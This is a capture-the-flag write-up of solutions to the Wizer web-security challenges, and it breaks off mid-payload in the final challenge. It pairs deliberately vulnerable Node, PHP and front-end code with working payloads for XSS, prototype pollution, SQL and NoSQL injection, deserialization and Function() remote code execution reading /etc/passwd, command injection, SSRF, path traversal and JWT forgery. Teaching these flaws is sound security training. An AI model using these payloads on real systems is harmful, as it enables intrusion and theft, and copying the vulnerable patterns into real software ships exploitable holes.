# Wizer CTF Challenges

<br />

### #0: My First CTF Experience!

**Goal:** Inject an alert("Wizer")

**code:**

```
<html>
<head>
<title> Dashboard </title>
</head>
<body>
<script>
    let startPosition = document.URL.indexOf("role=") + 5;
    let userRole = document.URL.substring(startPosition,document.URL.length); 
    document.write('<h1>' + decodeURI(userRole) + '</h1>');
</script>
</body>
</html>
```

<br />

it is just take whatever the user writes after `role` parameter and print it on the page in `h1` tag

<br />

**Solution:**

```
https://chal0.vercel.app/dashboard.html?role=<script>alert("Wizer")</script>
```



<br /><br />



### **#1: Image Previewer**

**Goal:** Inject an alert("Wizer")

**code:**

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Image preview</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.1/purify.min.js"
            integrity="sha512-TU4FJi5o+epsahLtM9OFRvH2gXmmlzGlysk9wtTFgbYbMvFzh3Cw1l3ubnYIvBiZCC/aurRHS408TeEbcuOoyQ=="
            crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>
<body>
    <h1>Preview an image</h1>
    <span id="image"></span>
    <script>
        // Get the image GET parameter
        const queryString = window.location.search;
        const urlParams = new URLSearchParams(queryString);
        const imageParam = urlParams.get('image')

        // Using DOMPurify to sanitize user input!
        const url = DOMPurify.sanitize(imageParam);
        const image = "<img src=\"" + url + "\">";
        document.getElementById('image').innerHTML = image;
    </script>
</body>
</html>
```

the source of the image is taken from `image` parameter, then DOMPurity will sanitize HTML.  so the basic payload will not work here.

```
?image=x" <script>alert()</script>
```

however we can use event handlers like `onerror` to exploit the xss

<br />

**Solution:**

```
https://chal1.vercel.app/dashboard.html?image=x" onerror="alert('Wizer')
```



<br /><br />





### #2: Create a User Endpoint

**Goal:** Create an admin via API

**code:**

```
const express = require('express');
var bodyParser = require('body-parser');
const { inviteCode } = require('./secret');
const app = express();
app.use(bodyParser.json());
const log = console.log;

console.log = function(){
    log.apply(console, [new Date(), ...arguments]);
};

const PORT = 5001;

const LOG_JSON = 'JSON: ';
const LOG_RUNNING_ON_PORT = 'Running at Port %s';

function createAdmin(user) { }
function createUser(user) { }



app.post('/api/createUser', function(req,res) {    
    console.log('/api/createUser in API');
    console.log(LOG_JSON, req.body);

    let baseUser = { 'picture': 'default.png' }
    let user = null;
    try {
        user = req.body;
        if(user.isAdmin && user.inviteCode !== inviteCode) {
            res.send('No invite code? No admin!');
        } else {
            let newUser = Object.assign(baseUser, user);
            if(newUser.isAdmin) createAdmin(user)
            else createUser(newUser);
            res.send('Successfully created' + 
                     `${newUser.isAdmin ? ' Admin' : ' User'}`);
        }
        baseUser.__proto__ = { "isAdmin": false };
    } catch(e) {
        console.log(e);
        res.send(e.message);
    }
});

app.listen(PORT, () => {
    console.log(LOG_RUNNING_ON_PORT, PORT);
});

module.exports = app;
```

we need to create an admin user. this endpoint allows us to create a user and also admin. but to create admin we need an invitation code and we do not have access to the invitation code.

<br />

if you tried to create a new user

```json
{
    "name": "karim"
}
```

it will create a user not an admin.

<br />

if you tried to add `isAdmin` in the request

```
{
	"name": "karim",
	"isAdmin": true
}
```

you will get `No invite code? No admin!`

<br />

the vulnerability here is prototype pollution

```
let newUser = Object.assign(baseUser, user);
```

here, the user properties that we provide in the body of the request will assign to the base user to get the `picture` prosperity.

if we add `__proto__:{ "isAdmin": true}` 

now every user will have `isAdmin` property and the default is `true`

<br />

**Solution:**

```json
{
	"name":"test", 
	"__proto__":{
		"isAdmin": true
	}
}
```



<br /><br />





### #3: Welcome Page

**Goal:** Inject an alert("Wizer")

**Code:**

```
<?php
$nonce = md5(random_bytes(32));
header("Content-Security-Policy: script-src 'nonce-$nonce'");
?>
<head>
    <meta charset="UTF-8">
    <title>
        <?php echo 'Welcome ' . ($_GET['name'] ?? "") ?>
    </title>
    <script nonce="<?php echo $nonce ?>">
        window.environment = 'production';
    </script>
</head>
<body>
<script nonce="<?php echo $nonce ?>">
    if (window.environment && window.environment !== 'production') {
        let debug = new URL(location)
            .searchParams.get('debug') || '';
        const script = document.createElement('script');
        script.nonce = "<?php echo $nonce ?>";
        script.innerText = debug;
        document.body.appendChild(script);
    }
</script>
</body>
```

The HTML nonce attribute is a global content attribute that defines a cryptographic nonce(” number used once “). It is used by Content Security Policy(it is an additional layer of security that helps to detect and mitigate certain types of attacks like data injection attacks) to check whether a given fetch will be allowed to proceed for a given element or not. Generally, the attribute nonce specifies the way by which the browser is told that inline contents of some style element or specific/particular script were not injected into the document by third parties and were put in the document intentionally by whoever controls the server from where the document is served. It allows the list of specific elements such as some specific inline script or style elements. It helps to avoid the use of the CSP unsafe-inline directive that would allow-list all inline styles.

<br />

we need to skip the script line `window.environment = 'production'`. we need to force it to be empty or anything rather than "production".

So we need to close the title tag `</title>` and open a new `<script>` in the name parameter. This would break the following script and cause it to be skipped. 

Now `window.environment = undefined`

We can use DOM Clobbering to make the window.environment = anything by adding a new element with id=environment.

![](./assets/1.png)

<br />

**Solution:**

```
https://starfish-app-vexnk.ondigitalocean.app/?debug=alert("Wizer")&name=test</title><a id=environment><script>
```

<br />

**References:**

- https://www.geeksforgeeks.org/html-nonce-attribute/
- https://content-security-policy.com/nonce/

<br /><br />







### #4:  Movies Database Query

**Goal:** Get the secret key from file 'secret.js'

**Code:**

```javascript
import clientPromise from "../../lib/mongodb";
const serialize = require('node-serialize');
let response;

export default async (req, res) => {
   try {
       var noItemsMessage = "No Items Found";
       var numberOfItems = null;
       const data = serialize.unserialize(req.body);
       var query;

       if(typeof(data) === 'object') {
            query = `{ "${data.fieldName}": null }`;
            noItemsMessage = data.message;
            numberOfItems = data.items;
       } else {
            response = "specify query!";     
            res.send(response);
            return;
       }
       
       const client = await clientPromise;
       const db = client.db("sample_mflix");
       query = JSON.parse(query);
       query[data.fieldName] = data.fieldValue;
       const movies = await db
           .collection("movies")
           .find(query)
           .sort({ metacritic: -1 })
           .limit(isNaN(numberOfItems) ? 1 : numberOfItems > 20 ? 20 : numberOfItems)
           .maxTimeMS(5000)
           .toArray();
       if(movies.length === 0) {
            res.send(noItemsMessage);
            return;
       }

       res.send(JSON.stringify(movies));
   } catch (e) {
       console.error(e);
   }
};
```

<br />

return a value

```
{
"fieldName":"year",
"fieldValue":1821,
"items":1,
"message":"_$$ND_FUNC$$_function(){ var a='lol' ;return a; }()"}
```

<br />

read files

```
{
"fieldName":"_id",
"fieldValue":1821,
"items":1,
"message":"_$$ND_FUNC$$_function(){ var fs = require('fs'); var result = fs.readFileSync('/etc/passwd', 'utf8'); return result; }()"}
```

<br />

read directories

```
{
"fieldName":"_id",
"fieldValue":1821,
"items":1,
"message":"_$$ND_FUNC$$_function(){ var fs = require('fs'); var result = fs.readdirSync('/', 'utf8'); return result; }()"}
```

<br />

final

```
{
"fieldName":"_id",
"fieldValue":1821,
"items":1,
"message":"_$$ND_FUNC$$_function(){ var execSync = require('child_process').execSync; var result = execSync('ls -la .next/server/pages/api', { encoding: 'utf8' }); return result; }()"}


{
"fieldName":"_id",
"fieldValue":1821,
"items":1,
"message":"_$$ND_FUNC$$_function(){ var execSync = require('child_process').execSync; var result = execSync('cat .next/server/pages/api/secret.js', { encoding: 'utf8' }); return result; }()"}
```

refrence:

- https://www.digitalocean.com/community/tutorials/how-to-launch-child-processes-in-node-js
- https://nodejs.org/api/child_process.html
- https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
- https://snyk.io/blog/preventing-insecure-deserialization-node-js/

<br /><br />



### **#7: Login Page**

```
[{"name":"user","value":"isaac' or 1#"},{"name":"password","value":"tifat123!"}]
```



<br /><br />

### **#8: Menu**

```
https://chal8.vercel.app/?directLink=javaScripjavaScriptt:alert("Wizer")
```

Attackers will always attempt to bypass the sanitization by using common practices such as escaping special characters, but in this case, the easiest approach is to take advantage of the fact that the "replace" method performs only a single pass over the string, to replace the occurrences of a certain substring. With that in mind, strings such as `javajavascriptscript:[malicious code here]` will result with exactly what the developer was trying to prevent after the replace function is completed, which is `javascript:[malicious code here]`.

<br /><br />



### **#9: Create User Card**

```
{"firstName":"a\"><<!!ENTITY lastName SYSTEM \"file:///etc/passwd","role":"any"}
```

<br /><br />

### **#10: Messages App**

<br />

In this challenge, the only code you have access to review is the front-end code, which is what's running in the browser, and it seems nicely protected against XSS. However, what happens if an attacker bypasses that front-end and interacts directly with the back-end API? A closer look into the views/addMessage page, reveals that the service invoked is `../api/addMessage`. A quick validation using any of the API testing tools (i.e. Postman or Burpsuite) uncovers the vulnerability, where the API code isn't protecting against saving malicious HTML into the message.

<br />

from inspect element => remove the id="floatingMessage" from the textarea element to bypass the sanitization of DOMPurity

`<textarea name="message" class="form-control" placeholder="Message" id=""></textarea>`

then you can inject any xss payload 

```
<img src=x onerror=alert("Wizer")>
```

the problem here was the validation is done in client side only on the id="floatingMessage" by DOMPurify and the content of the textarea will be but in the DOM by `innerHTML` not `innerText`. 

```
document.getElementById("message").innerHTML = json[0].message;
```

Also you can just send the payload from burp to bypass the client side validation

```
[{"name":"firstName","value":"ddd"},{"name":"lastName","value":"test"},{"name":"message","value":"<audio src/onerror=alert(\"Wizer\")>"}]
```



<br /><br />



### **#11: Tasks Manager**

**Goal:** Logged in as Dave Cohen (user-id:10024), you need to get Jeff Gonzales's Tasks

**Code:**

```
// api/users.js
import clientPromise from "../../lib/mongodb";

export default async (req, res) => {
    try {
        if(typeof(req.body) === 'object') {
            const client = await clientPromise;
            const db = client.db("challenge_11");
            const user_ids = req.body.user_ids;
            const users = await db
                .collection("users")
                .find({ id: { $in: user_ids }}, { projection: { _id: 0 } }) 
                .maxTimeMS(5000)
                .toArray()
            res.send(JSON.stringify(users));
        } else {
            res.send("Invalid arguments provided");
        }
    } catch (e) {
        res.status(500).end(e.message);
        console.error(e);
    }
};

// api/tasks.js
import clientPromise from "../../lib/mongodb";

export default async (req, res) => {
    try {
        if(typeof(req.body) === 'object') {
            const client = await clientPromise;
            const db = client.db("challenge_11");
            const user_id = String(req.body.user_id);
            const tasks = await db
                .collection("tasks")
                .find({ user_id: Number(user_id) }, { projection: { _id: 0 } }) 
                .maxTimeMS(5000)
                .toArray()
            res.send(JSON.stringify(tasks));
        } else {
            res.send("Invalid arguments provided");
        }
    } catch (e) {
        res.status(500).end(e.message);
        console.error(e);
    }
};
```

<br />

The code below showcases two API endpoints from a task management system: /users & /tasks. The first endpoint retrieves the users records of a specified list of user_ids and the second retrieves the tasks of a specified user-ID. Many players initially attempted to exploit a possible NO-SQLi vulnerability. However, the code is not actually vulnerable to NO-SQLi because the first endpoint does not allow any nesting, which is the typical NO-SQLi method in similar cases. This limitation is due to the type of argument it accepts—an array of IDs. On the other hand, the second endpoint converts the argument into a number, making NO-SQLi tricks possible as well. The user IDs are assigned as running sequential numbers.

<br />

taking a closer look at an IDOR vulnerability:

In this particular case, it is easy to guess other User-IDs. Based on one's user ID, an attacker could easily scan the preceding and following IDs i.e. given David's user ID is 10024, preceding numbers would be 10023, 10022, 10021 and so on, and following numbers will be 10025, 10026, 10027 and so on. Since there's no authentication, this example isn't realistic and hence fairly easy to solve.

```
{"user_id":"10028"}
```

<br /><br />

### **#12: List of Company Assets**

**Goal:** Read the content of the OS's `passwd` file

**Code:**

```javascript
const express = require('express')
const bodyParser = require('body-parser');
const app = express();
require('dotenv').config();
app.use(bodyParser.json());
const { MongoClient, ServerApiVersion } = require('mongodb');
const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

function getMongoClient() {
    return client = new MongoClient(process.env.uri, {
        serverApi: { version: ServerApiVersion.v1, strict: true, deprecationErrors: true,}
    });
}

app.post('/companyAssets', async (req, res) => {
    try {
        let json = req.body;
        let companyId = String(json.companyId);
        let result = "invalid company Id";
        const client = getMongoClient(); 

        if(companyId.match(uuidFormat)) {
            await client.connect();
            const collection = client.db("chal12").collection("assetsFolders");
            let cursor = collection.find({ "companyId": companyId }).limit(1);
            let folderName = (await cursor.next())?.folder;
            console.log("folder name:", folderName);
            let execSync = require('child_process').execSync;
            result = execSync(`ls -1 ${folderName}`).toString();
        }
        res.send(result);
    } catch (e) {
        res.send(e.message);
        console.error(e.message);
    } finally {
        await client.close();
    }
})

const sanitizeFolder = (folder) => {
    folder = String(folder).replaceAll(';','').replaceAll('|','').replaceAll('&','')
                           .replaceAll('>','').replaceAll('<','').replaceAll('!','')
                           .replaceAll('\`','').replaceAll('\n','').replaceAll('\r','');
    if(!folder.endsWith('/assets')) {
        folder += '/assets';
    }
    return folder.replace('//', '/');
}

app.post('/addAssetsFolder', async (req, res) => {
    try {
        let json = req.body;
        let companyId = String(json.companyId);
        let folder = sanitizeFolder(json.folder) ?? '';
        const client = getMongoClient(); 

        if(folder != '' && companyId.match(uuidFormat)) {
            await client.connect();
            const collection = client.db("chal12").collection("assetsFolders");
            const existing = await collection.find({"companyId": companyId}).toArray();

            if(existing.length === 0) {
                await collection.insertOne({ 
                    "companyId": companyId, 
                    "folder": folder
                });
                res.sendStatus(200);
            }
            else res.send("company assets folder already exists");
        }
        else res.send("invalid arguments provided");
    } catch (e) {
        res.send(e.message);
        console.error(message);
    } finally {
        await client.close();
    }
})

app.listen(process.env.port, () => {
    console.log(`API listening on PORT ${process.env.port}`)
})

module.exports = app
```

<br />



```
POST /addAssetsFolder

{"companyId":"550e8400-e29b-41d4-a716-446655440004","folder":"$(cat /etc/passwd)"}
```

then

```
POST /companyAssets HTTP/2

{"companyId":"550e8400-e29b-41d4-a716-446655440004"}
```



<br /><br />

### **#13: Company Logos**

**Goal:** Get the list of CRM users from the internal network API

**Code:**

```javascript
import express from 'express';
const app = express();
const app2 = express();
import fs from 'fs';
import fetch from "node-fetch";
import bodyParser from 'body-parser';
app.use(bodyParser.json());
import dotenv from 'dotenv';
import { CRMUsers } from './crm.mjs';
dotenv.config();

const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

app.post('/getCompanyLogo', async (req, res) => {
    try {
        let json = req.body;
        let companyId = String(json.companyId);

        if(companyId != '' && companyId.match(uuidFormat)) {
            const data = fs.readFileSync(`${process.env.companyLogosFolder}/${companyId}`);
            res.send(data);
        }
        else res.send("invalid arguments provided");
    } catch (e) {
        res.send(e.message);
    }
})

const validURL = (ImageURL) => {
    try {
        const newUrl = new URL(ImageURL);
        return newUrl.protocol === 'http:' || newUrl.protocol === 'https:';
    } catch (err) { return false; }
}

app.post('/setCompanyLogo', async (req, res) => {
    try {
        console.log("remote ip:" + requestIp.getClientIp(req));
        let json = req.body;
        let companyId = String(json.companyId);
        let imageUrl = validURL(json.imageUrl) ? json.imageUrl : '';
        console.log("/setCompanyLogo companyId:", companyId, "imageURL:", imageUrl);

        if(companyId != '' && companyId.match(uuidFormat)) {
            const result = await fetch(imageUrl);
            fs.writeFileSync(`${process.env.companyLogosFolder}/${companyId}`, await result.text());
            res.sendStatus(200);
        }
        else res.send("invalid arguments provided");
    } catch (e) {
        res.send(e.message);
    }
})

app2.get('/CRMUsers', async (req, res) => {
    res.send(CRMUsers);
})

app.listen(process.env.port, () => {
    console.log(`API listening on PORT ${process.env.port}`)
})

// Internal service; accessible only from localhost on port 4001
app2.listen(4001, 'localhost', function() {
    console.log("Internal service started port %d in %s mode", 4001, app2.settings.env);
});
```

SSRF in logo image URL

```
POST /setCompanyLogo

{
  "companyId": "11fe8700-e29b-41d4-a716-446655440000",
  "imageUrl": "http://localhost:4001/CRMUsers"
}
```

<br />

```
POST /getCompanyLogo

{
  "companyId": "11fe8700-e29b-41d4-a716-446655440000"
}
```



<br />

<br />

### **#14: Points Management**

**Goal:** Assume your balance is sufficient, make the app transfer 100 points to account# 8AAB24BF80DE40D584E6608452AB48F9

**Code:**

```javascript
import styles from '../styles/Inner.module.css'
import { useRouter } from 'next/router';
import React from 'react';
import $ from 'jquery';
import Image from 'next/image';
import DOMPurify from 'dompurify';

export default function Home() {
    const router = useRouter();
    const { yourName, yourAvatar, transferTo, pointsToTransfer } = router.query;
    const isNameProvided = typeof yourName === 'string' && yourName.length > 0; 
    React.useEffect(() => {
      if (router.isReady && isNameProvided) {
        // Sanitize your-name and avatar image
        const name = DOMPurify.sanitize(String(yourName));
        const avatar = yourAvatar ? DOMPurify.sanitize(String(yourAvatar)) : '<img src="/favicon.png" width="20px">';
        document.getElementById('name').innerText = name;
        document.getElementById('avatar').innerHTML = avatar;
        if(window.transferBalance && transferTo && pointsToTransfer) {
          var formData = JSON.stringify($(router.query).serializeArray());
          const response = $.ajax({type: "POST", url: "../api/transferPoints", async: false,
                                   data: formData, success: function(){}, dataType: "json",
                                   contentType : "application/json"})
          if(response.status === 200) { alert(`${name}, you've successfully transfered ${pointsToTransfer}` + 
                                              ` points to account ID ${transferTo}`); } 
          else { $("#error").text(decodeURIComponent(response.responseText));}
        }
      }
    }, [router.isReady, isNameProvided]);

  return (
      <main className="text-center mt-5">
        <h6>
          <span id="avatar"></span>&nbsp;&nbsp;
          <span>Hello </span><span id="name"></span><span id="name">, what would you want to do next?</span>
        </h6>
        <h3 className="h3 mb-3 fw-normal">Points management</h3>
        <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}} 
            onClick={() => { router.push("/transfer")}}>Transfer Points</h5>
        <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}} 
            onClick={() => { router.push("/buy")}}>Buy points</h5>
        <h5 className="h5 mb-2 fw-normal" style={{cursor: 'pointer'}} 
            onClick={() => { router.push("/trends")}}>Points spending trends</h5>
        <div className={styles.footer}>
          Powered by <Image src="/wizer.svg" 
                            alt="Wizer" 
                            width={200} 
                            height={100} 
                            className={styles.logo} />
        </div>
      </main>
  )
}
```

<br />

DOM Clobbering: DOM Clobbering vulnerability since `window` global variables can be substituted with global DOM elements.

The action is protected by a window variable called `transferBalance`, and only if this variable is set to true, a transfer action can be executed. Note that the page also accepts `yourName` and `yourAvatar` variables which are used to display the user's name and avatar in the page.

```
https://chal14.vercel.app/?yourName=Karim&yourAvatar=<h1>test</h1><a id=transferBalance>&transferTo=8AAB24BF80DE40D584E6608452AB48F9&pointsToTransfer=100
```





<br />

<br />

### **#15: Login Here**

**Goal:** Via API, login as the admin user Gabriel Tensey (UI: https://chal15.vercel.app/)

**Code:**

```javascript
import dotenv from 'dotenv';
import mysql from 'mysql2';
const bcrypt = require("bcryptjs")
dotenv.config();

const encrypt = (clearText) => {
    const salt = bcrypt.genSaltSync(10);
    return bcrypt.hashSync(clearText, salt);
}

const getUser = async (userName) => {
    let connection = mysql.createConnection(process.env.DATABASE_URL);
    const query = `SELECT * FROM users_tbl
                    WHERE userName = '${userName}'`;
    const [rows, fields] = await connection.promise().query(query);

    connection.end();
    return rows;
}

const login = async (userName, password) => {
    const hashedPassword = encrypt(String(password));
    const rows = await getUser(userName);
    if(rows.length == 1 && bcrypt.compareSync(password, rows[0].password)) {
        return rows;
    }
    
    return [];
};
  
export default async (req, res) => {
    try {
        const result = await login(req.body[0].value, req.body[1].value);
        if(result.length > 0) {
            res.status(200).send(result);
        } else {
            res.status(401).send("Invalid username or password");
        }
    } catch (e) {
        res.status(500).send(e.message);
    }
};
```

<br />



```
POST /api/login

[
    { "value": "' UNION SELECT '1'#" },
    { "value": "pass" }
]
```

response: target: chal7.-.primary: vttablet: rpc error: code = InvalidArgument desc = The used SELECT statements have a different number of columns (errno 1222) (sqlstate 21000) (CallerID: an0lhxqhrn61aphfq1dy): Sql: "select * from users_tbl where userName = :userName 

<br />



```
POST /api/login

[
  { "value": "' UNION SELECT null, null, null,null,null,null #" },
  { "value": "pass" }
]
```

response: Illegal arguments: string, object. So the number of columns is 6.

<br />

```
POST /api/login

[
  {
    "value": "' UNION SELECT 'a', 'a', 'a','a','a','a' #"
  },
  {
    "value": "pass"
  }
]
```

response: Invalid username or password



<br />

get the bcrypt hash of the "pass" with salt 10 using https://bcrypt.online/

```
POST /api/login

[
  {
    "value": "' UNION SELECT 1,'karim','$2y$10$0U1NvVUPKE9iKUXibTI6tumgzGz7MW/fntx/FvaoMI7eXNxs2DCB2', 'admin','Gabriel','Tensey' -- -"
  },
  {
    "value": "pass"
  }
]
```

response:

```
[
  {
    "id": 1,
    "userName": "karim",
    "password": "$2y$10$0U1NvVUPKE9iKUXibTI6tumgzGz7MW/fntx/FvaoMI7eXNxs2DCB2",
    "type": "admin",
    "lastName": "Gabriel",
    "firstName": "Tensey"
  }
]
```

The bcrypt string is a genuinely hashed password of our choice, which we'll provide as the value for the second argument, and as you can see, all the other values are literals of our choice. So the record returned is actually all fake and does the trick, where last and first name are correctly present. The "-- -" sequence at the end makes sure that whatever comes later, is commented out, so it's not in our way.

<br /><br />



### **#16: Companies API**

**Goal:** Via Companies API, get the list of all companies

**Code:**

```javascript
import clientPromise from "../../lib/mongodb";

const isValid = (value) => {
    const expression = RegExp(`(\"\$ne\")+|(\"\$eq\")+|(\"\$not\")+` +
    `|(\"\$in\")+|(\"\$nin\")+|(\"\$gt\")+` +
    `|(\"\$gte\")+|(\"\$lt\")+|(\"\$lte\")+` + 
    `|(\"\$nor\")+|(\"\$and\")+|(\"\$exists\")+` +
    `|(\"\$type\")+`); 
    const invalid = JSON.stringify(value).search(expression);
    return invalid == -1;
}

export default async (req, res) => {
    try {
        if(typeof(req.body) === 'object' && isValid(req.body.company_id)) {
            const client = await clientPromise;
            const db = client.db("challenge_5");
            const company = await db
                .collection("companies")
                .find({ company_id:  req.body.company_id})
                .maxTimeMS(5000)
                .toArray();
            res.send(JSON.stringify(company));
        } else {
            res.send("Invalid arguments provided");
        }
    } catch (e) {
        res.status(500).end(e.message);
        console.error(e);
    }
};
```

<br />



```
POST /api/companies

{
  "company_id": {
    "$regex": ".*"
  }
}
```

<br /><br />

### **#17: Privacy Policy Viewer** 

**Goal:** Read the content of the OS's `passwd` file

**Code:**

```javascript
// viewer.js 
import { useRouter } from 'next/router';
import React from 'react';

export default function Home() {
    const router = useRouter();
    const { companyName } = router.query;
    const isCompany = typeof companyName === 'string' && companyName.length > 0; 

    const getPrivacyPolicy = (companyName) => {
      fetch("../api/privacy", { method: "POST", body: JSON.stringify({ "companyName": companyName }),
                                    headers: { "content-type": "application/json",}})
      .then(response => response.json())
      .then(json => { 
        document.getElementById("content").innerText = json.text; 
      })
      .catch((e) => console.log("client:", e));
    };

    React.useEffect(() => {
      if (router.isReady && isCompany) {
        getPrivacyPolicy(companyName);
        document.getElementById("title").innerText = `Privacy Policy for ${companyName}`; 
      }
    }, [router.isReady, isCompany]);

  return (
      <main className="text-center mt-5">
        <h3 id="title" className="h3 mb-3 fw-normal">Privacy Policy Viewer</h3>
        <pre>
          <div id="content" style={{textAlign: 'left'}}>
            No Policy Selected
          </div>
        </pre>
      </main>
  )
}

// privacy.js
import fs from "fs";

export default async (req, res) => {
    try {
        const text = fs.readFileSync(
            `${process.cwd()}/privacyPolicies/${req.body.companyName}`,
            { encoding: 'utf8', flag: 'r' });
        res.send({ "text": text});
    } catch (e) {
        res.status(500).end(e.message);
        console.error(e);
    }
};
```

<br />

```
POST /api/privacy

{
  "companyName": "../../../../etc/passwd"
}
```

<br /><br />



### **#18: Registration and Login**

**Goal:** Login as an admin! (login page: chal18.vercel.app/)

**Code:**

```javascript
const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const path = require('path');

const app = express();
app.use(bodyParser.json());
app.use(cors());

function auth(req, res, next) {
    const token = req.body['session'];
    if (!token) {
        return res.status(401).json({ message: 'Authentication required' });
    }
  
    jwt.verify(token, 'password123', (err, user) => {
        if (err) return res.status(403).json({ message: 'Invalid token' });
        req.user = user;
        if (user && user.isAdmin === true) {
            req.admin = true;
        } else {
            req.admin = false;
        }
        next();
    });
}

// In-memory database (temporary array)
const users = [];

// Serve the entire 'public' folder as static assets
app.use(express.static(path.join(__dirname, 'public')));

// Register a new user
app.post('/register', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) {
    return res.status(400).json({ message: 'Username and password are required' });
  }

  const user = { username, password };
  users.push(user);
  res.status(201).json({ message: 'Registration successful' });
});

// Login and generate a JWT token
app.post('/login', (req, res) => {
  const { username, password } = req.body;
  const user = users.find(u => u.username === username && u.password === password);
  if (!user) {
    return res.status(401).json({ message: 'Invalid credentials' });
  }

  const token = jwt.sign({ username }, 'password123', { expiresIn: '1h' });
  res.json({ token });
});

// Profile page accessible only to authenticated users
app.post('/profile', auth, (req, res) => {
    if (req.admin) {
        res.json({ message: 'You are the admin!'});
    } else {
        res.json({ message: 'Welcome to your profile, ' + req.user.username + '. You are not the admin.' });
    }
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
```

<br />

```
POST /register

{
  "username": "test",
  "password": "test"
}
```

<br />

```
POST /login

{
  "username": "test",
  "password": "test"
}
```

<br />

because you have the JWT secret "password123", you can generate a new valid JWT token with "isAdmin": true

```
POST /profile

{
  "session": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzM5MjE3ODcxLCJleHAiOjE3MzkyMjE0NzF9.UPTetJKNJYZGDjZN11QE5md06xExfue-hCE0HhM6z4w"
}
```

<br /><br />



### **#19: Calculator**

**Goal:** Read the content of the OS's `passwd` file

**Code:**

```javascript
const express = require('express')
const bodyParser = require('body-parser');
const app = express();
require('dotenv').config();
const math = require('mathjs');

app.use(bodyParser.json());
const requestIp = require('request-ip');

app.post('/calc', async (req, res) => {
    try {
        console.log("remote ip:" + requestIp.getClientIp(req));
        let json = req.body;
        let calc = String(json.calculation);
        console.log("calc:", calc);    
        res.send(String(Function("return " + calc)(require)));
    } catch (e) {
        res.send(e.message);
        console.error(e.message);
    }
})

app.listen(process.env.port, () => {
    console.log(`API listening on PORT ${process.env.port}`)
})

module.exports = app
```

<br />

```
POST /calc

{"calculation":"process.cwd()"}
```

response: /var/task

<br />

```
POST /calc

{"calculation":"process.env.PWD"}
```

response: /var/task

<br />

The code below showcases a simple calculator endpoint. The developer figured this would be safer than just using eval because they read about scopes in JavaScript and noticed that Function() runs in a different scope. Today we prove that it's not safer at all! A requirement of the feature was to allow the consumers of the endpoint to take advantage of the `mathjs` library to enable calculations such as `100 + Math.sqrt(1000)`. To achieve that, the developer provided `require` as an external argument to the scope so that the isolated scope is able to run the following calculation: `100 + argument[0]('mathjs').sqrt(1000)`.

The `require` argument can be misused to import libraries which will provide unauthorized access to data/files and assets.

```
POST /calc

{"calculation":"arguments[0]('mathjs').sqrt(100)"}
```

response: 10

<br />

```
POST /calc

{
  "calculation": "arguments[0]('child_process').execSync('cat /etc/passwd');"
}
```

Never use `eval` nor `String(Function())` involving user input



<br /><br />



### **#20: API authentication Gateway**

**Goal:** Get Grandpa Joe's user record (Id:670b0741-9fb1-4ef7-afe9-842120a12fcb) from the API

**Code:**

```javascript
import express from 'express';
const app = express();
const app2 = express();
import bodyParser from 'body-parser';
app.use(bodyParser.json());
app2.use(bodyParser.json());
import dotenv from 'dotenv';
import { CRMEntities } from './crm.mjs';
import axios from 'axios';
import { MongoClient } from 'mongodb';
dotenv.config();
const uuidFormat = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-5][0-9a-f]{3}-[089ab][0-9a-f]{3}-[0-9a-f]{12}$/i;
const requireAuthentication = ['getuser', 'getcompany'];

app.post('/callApi', async (req, res) => {
    let json = req.body;
    let api = String(json.api)?.trim()?.toLowerCase();
    let token = json.token;
    try {
        if (requireAuthentication.includes(api)) {
            if (token == process.env.tokenSecret) {
                const response = await axios.post(`http://localhost:${process.env.internalPort}/${api}`, json);
                res.send(response.data);
            } else {
                res.send("Invalid token");
            }  
        } else {
            const response = await axios.post(`http://localhost:${process.env.internalPort}/${api}`, json);
            res.send(response.data);
        }
    } catch(e) {
        res.status(500).end(e.message);
        console.error(e);
    }
});

app2.post('/getUser', async (req, res) => {
    const client = new MongoClient(process.env.MONGODB_URI);
    try {
        const userId = req.body.userId;
        if(typeof(req.body) === 'object' && userId && userId.match(uuidFormat)) {
            await client.connect();
            const db = client.db("challenge_5");
            const user = await db
                .collection("users")
                .find({ user_id: userId }) 
                .maxTimeMS(5000)
                .toArray()
            res.send(JSON.stringify(user));
        } else {
            res.send("Invalid arguments provided");
        }
    } catch (e) {
        res.status(500).end(e.message);
        console.error(e);
    } finally {
        await client.close();
    }
})

app2.post('/getCompanies', async (req, res) => {
    const client = new MongoClient(process.env.MONGODB_URI);
    try {
        const companyId = req.body.companyId;
        if(typeof(req.body) === 'object' && companyId && companyId.match(uuidFormat)) {
            await client.connect();
            const db = client.db("challenge_5");
            const company = await db
                .collection("companies")
                .find({ company_id: companyId })
                .maxTimeMS(5000)
                .toArray();
            res.send(JSON.stringify(company));
        } else {
            res.send("Invalid arguments provided");
        }
    } catch (e) {
        res.status(500).end(e.message);
        console.error(e);
    } finally {
        await client.close();
    }
})

app2.post('/CRMEntities', async (req, res) => {
    res.send(CRMEntities);
})

app.listen(process.env.externalPort, () => {
    console.log(`External API listening on PORT ${process.env.externalPort}`)
})

// Internal service; accessible only from localhost
app2.listen(process.env.internalPort, 'localhost', function() {
    console.log(`Internal service started port ${process.env.internalPort}`);
});
```

<br /><br />



```
POST /callApi

{
  "api": "../getUser",
  "token": "a",
  "userId": "670b0741-9fb1-4ef7-afe9-842120a12fcb"
}

OR

{
  "api": "getUser/",
  "token": "a",
  "userId": "670b0741-9fb1-4ef7-afe9-842120a12fcb"
}

OR

{
  "api": "./getUser",
  "token": "a",
